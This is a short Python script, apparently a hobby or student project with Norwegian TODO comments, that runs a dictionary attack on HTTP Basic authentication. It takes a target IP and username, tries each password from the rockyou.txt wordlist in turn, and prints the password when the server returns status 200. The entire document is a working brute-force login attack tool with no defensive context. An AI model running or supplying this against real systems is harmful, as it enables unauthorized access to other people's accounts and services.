from requests.auth import HTTPBasicAuth
import requests
from concurrent.futures import ThreadPoolExecutor
import time
import threading


print("Welcome to HTTTPBasic auth dictionary attack")
ipadr = input("Type the ip address: ")
username = input("First: Do you have a username you want to try? ")

start = time.time() #starts the timer



#TODO
#Optimalisere koden med concurrent for raskere jobbing
#Fikse bug med at den ikke printer rett i den første linjen

i = 0
f = open(r'rockyou.txt', 'r', encoding="latin-1") #opens the wordlist
line = f.readline()
while line:
    with ThreadPoolExecutor() as executor:
        line = f.readline()
        print("Line {}: {}".format(i, line.strip())) #prints number of try and password tried
        r = requests.get("http://"+ipadr, auth=HTTPBasicAuth('{}'.format(username.strip()), '{}'.format(line.strip()))) #sends request to the ip and tries to login. Recieves status codes
        i += 1 #adds a number to the count
        if r.status_code == 200: #if the status code is positive stops the tries and prints
            print("Password found!")
            print("The password is: {}".format(line.strip()))
            break

end = time.time() #ends the timer 
print(end - start) #prints the time used to find the password